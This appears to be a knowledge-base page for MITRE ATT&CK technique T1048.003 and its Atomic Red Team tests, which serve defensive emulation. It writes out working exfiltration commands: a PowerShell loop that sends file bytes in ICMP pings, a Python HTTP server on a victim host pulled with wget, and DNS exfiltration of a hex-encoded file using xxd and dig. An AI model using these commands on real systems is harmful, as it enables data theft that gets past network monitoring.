
# Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

## Description

### MITRE Description

> Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. 

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: True
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1048/003

## Potential Commands

```
$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }
```

## Commands Dataset

```
[{'command': '$ping = New-Object System.Net.Networkinformation.ping; '
             'foreach($Data in Get-Content -Path '
             'C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount '
             '1024) { $ping.Send("#{ip_address}", 1500, $Data) }\n',
  'name': None,
  'source': 'atomics/T1048.003/T1048.003.yaml'},
 {'command': '$ping = New-Object System.Net.Networkinformation.ping; '
             'foreach($Data in Get-Content -Path #{input_file} -Encoding Byte '
             '-ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }\n',
  'name': None,
  'source': 'atomics/T1048.003/T1048.003.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol': {'atomic_tests': [{'auto_generated_guid': '1d1abbd6-a3d3-4b2e-bef5-c59293f46eff',
                                                                                                                                                'description': 'A '
                                                                                                                                                               'firewall '
                                                                                                                                                               'rule '
                                                                                                                                                               '(iptables '
                                                                                                                                                               'or '
                                                                                                                                                               'firewalld) '
                                                                                                                                                               'will '
                                                                                                                                                               'be '
                                                                                                                                                               'needed '
                                                                                                                                                               'to '
                                                                                                                                                               'allow '
                                                                                                                                                               'exfiltration '
                                                                                                                                                               'on '
                                                                                                                                                               'port '
                                                                                                                                                               '1337.\n'
                                                                                                                                                               '\n'
                                                                                                                                                               'Upon '
                                                                                                                                                               'successful '
                                                                                                                                                               'execution, '
                                                                                                                                                               'sh '
                                                                                                                                                               'will '
                                                                                                                                                               'be '
                                                                                                                                                               'used '
                                                                                                                                                               'to '
                                                                                                                                                               'make '
                                                                                                                                                               'a '
                                                                                                                                                               'directory '
                                                                                                                                                               '(/tmp/victim-staging-area), '
                                                                                                                                                               'write '
                                                                                                                                                               'a '
                                                                                                                                                               'txt '
                                                                                                                                                               'file, '
                                                                                                                                                               'and '
                                                                                                                                                               'host '
                                                                                                                                                               'the '
                                                                                                                                                               'directory '
                                                                                                                                                               'with '
                                                                                                                                                               'Python '
                                                                                                                                                               'on '
                                                                                                                                                               'port '
                                                                                                                                                               '1337, '
                                                                                                                                                               'to '
                                                                                                                                                               'be '
                                                                                                                                                               'later '
                                                                                                                                                               'downloaded.\n',
                                                                                                                                                'executor': {'name': 'manual',
                                                                                                                                                             'steps': '1. '
                                                                                                                                                                      'Victim '
                                                                                                                                                                      'System '
                                                                                                                                                                      'Configuration:\n'
                                                                                                                                                                      '\n'
                                                                                                                                                                      '    '
                                                                                                                                                                      'mkdir '
                                                                                                                                                                      '/tmp/victim-staging-area\n'
                                                                                                                                                                      '    '
                                                                                                                                                                      'echo '
                                                                                                                                                                      '"this '
                                                                                                                                                                      'file '
                                                                                                                                                                      'will '
                                                                                                                                                                      'be '
                                                                                                                                                                      'exfiltrated" '
                                                                                                                                                                      '> '
                                                                                                                                                                      '/tmp/victim-staging-area/victim-file.txt\n'
                                                                                                                                                                      '\n'
                                                                                                                                                                      '2. '
                                                                                                                                                                      'Using '
                                                                                                                                                                      'Python '
                                                                                                                                                                      'to '
                                                                                                                                                                      'establish '
                                                                                                                                                                      'a '
                                                                                                                                                                      'one-line '
                                                                                                                                                                      'HTTP '
                                                                                                                                                                      'server '
                                                                                                                                                                      'on '
                                                                                                                                                                      'victim '
                                                                                                                                                                      'system:\n'
                                                                                                                                                                      '\n'
                                                                                                                                                                      '    '
                                                                                                                                                                      'cd '
                                                                                                                                                                      '/tmp/victim-staging-area\n'
                                                                                                                                                                      '    '
                                                                                                                                                                      'python '
                                                                                                                                                                      '-m '
                                                                                                                                                                      'SimpleHTTPServer '
                                                                                                                                                                      '1337\n'
                                                                                                                                                                      '\n'
                                                                                                                                                                      '3. '
                                                                                                                                                                      'To '
                                                                                                                                                                      'retrieve '
                                                                                                                                                                      'the '
                                                                                                                                                                      'data '
                                                                                                                                                                      'from '
                                                                                                                                                                      'an '
                                                                                                                                                                      'adversary '
                                                                                                                                                                      'system:\n'
                                                                                                                                                                      '\n'
                                                                                                                                                                      '    '
                                                                                                                                                                      'wget '
                                                                                                                                                                      'http://VICTIM_IP:1337/victim-file.txt\n'},
                                                                                                                                                'name': 'Exfiltration '
                                                                                                                                                        'Over '
                                                                                                                                                        'Alternative '
                                                                                                                                                        'Protocol '
                                                                                                                                                        '- '
                                                                                                                                                        'HTTP',
                                                                                                                                                'supported_platforms': ['macos',
                                                                                                                                                                        'linux']},
                                                                                                                                               {'auto_generated_guid': 'dd4b4421-2e25-4593-90ae-7021947ad12e',
                                                                                                                                                'description': 'Exfiltration '
                                                                                                                                                               'of '
                                                                                                                                                               'specified '
                                                                                                                                                               'file '
                                                                                                                                                               'over '
                                                                                                                                                               'ICMP '
                                                                                                                                                               'protocol.\n'
                                                                                                                                                               '\n'
                                                                                                                                                               'Upon '
                                                                                                                                                               'successful '
                                                                                                                                                               'execution, '
                                                                                                                                                               'powershell '
                                                                                                                                                               'will '
                                                                                                                                                               'utilize '
                                                                                                                                                               'ping '
                                                                                                                                                               '(icmp) '
                                                                                                                                                               'to '
                                                                                                                                                               'exfiltrate '
                                                                                                                                                               'notepad.exe '
                                                                                                                                                               'to '
                                                                                                                                                               'a '
                                                                                                                                                               'remote '
                                                                                                                                                               'address '
                                                                                                                                                               '(default '
                                                                                                                                                               '127.0.0.1). '
                                                                                                                                                               'Results '
                                                                                                                                                               'will '
                                                                                                                                                               'be '
                                                                                                                                                               'via '
                                                                                                                                                               'stdout.\n',
                                                                                                                                                'executor': {'command': '$ping '
                                                                                                                                                                        '= '
                                                                                                                                                                        'New-Object '
                                                                                                                                                                        'System.Net.Networkinformation.ping; '
                                                                                                                                                                        'foreach($Data '
                                                                                                                                                                        'in '
                                                                                                                                                                        'Get-Content '
                                                                                                                                                                        '-Path '
                                                                                                                                                                        '#{input_file} '
                                                                                                                                                                        '-Encoding '
                                                                                                                                                                        'Byte '
                                                                                                                                                                        '-ReadCount '
                                                                                                                                                                        '1024) '
                                                                                                                                                                        '{ '
                                                                                                                                                                        '$ping.Send("#{ip_address}", '
                                                                                                                                                                        '1500, '
                                                                                                                                                                        '$Data) '
                                                                                                                                                                        '}\n',
                                                                                                                                                             'name': 'powershell'},
                                                                                                                                                'input_arguments': {'input_file': {'default': 'C:\\Windows\\System32\\notepad.exe',
                                                                                                                                                                                   'description': 'Path '
                                                                                                                                                                                                  'to '
                                                                                                                                                                                                  'file '
                                                                                                                                                                                                  'to '
                                                                                                                                                                                                  'be '
                                                                                                                                                                                                  'exfiltrated.',
                                                                                                                                                                                   'type': 'Path'},
                                                                                                                                                                    'ip_address': {'default': '127.0.0.1',
                                                                                                                                                                                   'description': 'Destination '
                                                                                                                                                                                                  'IP '
                                                                                                                                                                                                  'address '
                                                                                                                                                                                                  'where '
                                                                                                                                                                                                  'the '
                                                                                                                                                                                                  'data '
                                                                                                                                                                                                  'should '
                                                                                                                                                                                                  'be '
                                                                                                                                                                                                  'sent.',
                                                                                                                                                                                   'type': 'String'}},
                                                                                                                                                'name': 'Exfiltration '
                                                                                                                                                        'Over '
                                                                                                                                                        'Alternative '
                                                                                                                                                        'Protocol '
                                                                                                                                                        '- '
                                                                                                                                                        'ICMP',
                                                                                                                                                'supported_platforms': ['windows']},
                                                                                                                                               {'auto_generated_guid': 'c403b5a4-b5fc-49f2-b181-d1c80d27db45',
                                                                                                                                                'description': 'Exfiltration '
                                                                                                                                                               'of '
                                                                                                                                                               'specified '
                                                                                                                                                               'file '
                                                                                                                                                               'over '
                                                                                                                                                               'DNS '
                                                                                                                                                               'protocol.\n',
                                                                                                                                                'executor': {'name': 'manual',
                                                                                                                                                             'steps': '1. '
                                                                                                                                                                      'On '
                                                                                                                                                                      'the '
                                                                                                                                                                      'adversary '
                                                                                                                                                                      'machine '
                                                                                                                                                                      'run '
                                                                                                                                                                      'the '
                                                                                                                                                                      'below '
                                                                                                                                                                      'command.\n'
                                                                                                                                                                      '\n'
                                                                                                                                                                      '    '
                                                                                                                                                                      'tshark '
                                                                                                                                                                      '-f '
                                                                                                                                                                      '"udp '
                                                                                                                                                                      'port '
                                                                                                                                                                      '53" '
                                                                                                                                                                      '-Y '
                                                                                                                                                                      '"dns.qry.type '
                                                                                                                                                                      '== '
                                                                                                                                                                      '1 '
                                                                                                                                                                      'and '
                                                                                                                                                                      'dns.flags.response '
                                                                                                                                                                      '== '
                                                                                                                                                                      '0 '
                                                                                                                                                                      'and '
                                                                                                                                                                      'dns.qry.name '
                                                                                                                                                                      'matches '
                                                                                                                                                                      '".domain"" '
                                                                                                                                                                      '>> '
                                                                                                                                                                      'received_data.txt\n'
                                                                                                                                                                      '\n'
                                                                                                                                                                      '2. '
                                                                                                                                                                      'On '
                                                                                                                                                                      'the '
                                                                                                                                                                      'victim '
                                                                                                                                                                      'machine '
                                                                                                                                                                      'run '
                                                                                                                                                                      'the '
                                                                                                                                                                      'below '
                                                                                                                                                                      'commands.\n'
                                                                                                                                                                      '\n'
                                                                                                                                                                      '    '
                                                                                                                                                                      'xxd '
                                                                                                                                                                      '-p '
                                                                                                                                                                      'input_file '
                                                                                                                                                                      '> '
                                                                                                                                                                      'encoded_data.hex '
                                                                                                                                                                      '| '
                                                                                                                                                                      'for '
                                                                                                                                                                      'data '
                                                                                                                                                                      'in '
                                                                                                                                                                      '`cat '
                                                                                                                                                                      'encoded_data.hex`; '
                                                                                                                                                                      'do '
                                                                                                                                                                      'dig '
                                                                                                                                                                      '$data.domain; '
                                                                                                                                                                      'done\n'
                                                                                                                                                                      '    \n'
                                                                                                                                                                      '3. '
                                                                                                                                                                      'Once '
                                                                                                                                                                      'the '
                                                                                                                                                                      'data '
                                                                                                                                                                      'is '
                                                                                                                                                                      'received, '
                                                                                                                                                                      'use '
                                                                                                                                                                      'the '
                                                                                                                                                                      'below '
                                                                                                                                                                      'command '
                                                                                                                                                                      'to '
                                                                                                                                                                      'recover '
                                                                                                                                                                      'the '
                                                                                                                                                                      'data.\n'
                                                                                                                                                                      '\n'
                                                                                                                                                                      '    '
                                                                                                                                                                      'cat '
                                                                                                                                                                      'output_file '
                                                                                                                                                                      '| '
                                                                                                                                                                      'cut '
                                                                                                                                                                      '-d '
                                                                                                                                                                      '"A" '
                                                                                                                                                                      '-f '
                                                                                                                                                                      '2 '
                                                                                                                                                                      '| '
                                                                                                                                                                      'cut '
                                                                                                                                                                      '-d '
                                                                                                                                                                      '" '
                                                                                                                                                                      '" '
                                                                                                                                                                      '-f '
                                                                                                                                                                      '2 '
                                                                                                                                                                      '| '
                                                                                                                                                                      'cut '
                                                                                                                                                                      '-d '
                                                                                                                                                                      '"." '
                                                                                                                                                                      '-f '
                                                                                                                                                                      '1 '
                                                                                                                                                                      '| '
                                                                                                                                                                      'sort '
                                                                                                                                                                      '| '
                                                                                                                                                                      'uniq '
                                                                                                                                                                      '| '
                                                                                                                                                                      'xxd '
                                                                                                                                                                      '-p '
                                                                                                                                                                      '-r\n'},
                                                                                                                                                'name': 'Exfiltration '
                                                                                                                                                        'Over '
                                                                                                                                                        'Alternative '
                                                                                                                                                        'Protocol '
                                                                                                                                                        '- '
                                                                                                                                                        'DNS',
                                                                                                                                                'supported_platforms': ['linux']}],
                                                                                                                              'attack_technique': 'T1048.003',
                                                                                                                              'display_name': 'Exfiltration '
                                                                                                                                              'Over '
                                                                                                                                              'Alternative '
                                                                                                                                              'Protocol: '
                                                                                                                                              'Exfiltration '
                                                                                                                                              'Over '
                                                                                                                                              'Unencrypted/Obfuscated '
                                                                                                                                              'Non-C2 '
                                                                                                                                              'Protocol'}}]
```

# Tactics


* [Exfiltration](../tactics/Exfiltration.md)


# Mitigations


* [Network Segmentation](../mitigations/Network-Segmentation.md)

* [Network Intrusion Prevention](../mitigations/Network-Intrusion-Prevention.md)
    
* [Filter Network Traffic](../mitigations/Filter-Network-Traffic.md)
    

# Actors


* [OilRig](../actors/OilRig.md)

* [FIN8](../actors/FIN8.md)
    
* [Thrip](../actors/Thrip.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [APT33](../actors/APT33.md)
    
* [APT32](../actors/APT32.md)
    
